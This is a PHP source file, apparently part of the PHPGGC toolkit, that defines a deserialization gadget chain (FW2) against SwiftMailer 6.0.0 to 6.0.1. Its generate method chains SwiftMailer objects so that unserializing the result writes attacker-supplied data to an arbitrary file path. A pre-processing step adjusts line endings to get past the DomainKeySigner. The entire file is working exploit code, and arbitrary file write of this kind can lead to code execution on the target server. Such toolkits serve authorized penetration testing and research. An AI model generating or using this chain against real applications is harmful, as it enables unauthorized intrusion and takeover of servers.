<?php

namespace GadgetChain\SwiftMailer;

class FW2 extends \PHPGGC\GadgetChain\FileWrite
{
	public $version = '6.0.0 <= 6.0.1';
	public $vector = '__toString';
	public $author = 'cf';

	public function pre_process(array $parameters)
	{
		$parameters = parent::pre_process($parameters);

		# \n must be preceeded by \r as per Swift_Signers_DomainKeySigner,
		# line 460
		$parameters['data'] = preg_replace(
			"/(?!\r)\n/",
			"\r\n",
			$parameters['data']
		);

		return $parameters;
	}

	public function generate(array $parameters)
	{
		$path = $parameters['remote_path'];
		$a = new \Swift_ByteStream_FileByteStream($path);
		$b = new \Swift_KeyCache_SimpleKeyCacheInputStream($a);
		$c = new \Swift_KeyCache_ArrayKeyCache($b);
		$d = new \Swift_Signers_DomainKeySigner($b);
		$e = new \Swift_Message($d, $c, $parameters['data']);

		return $e;
	}
}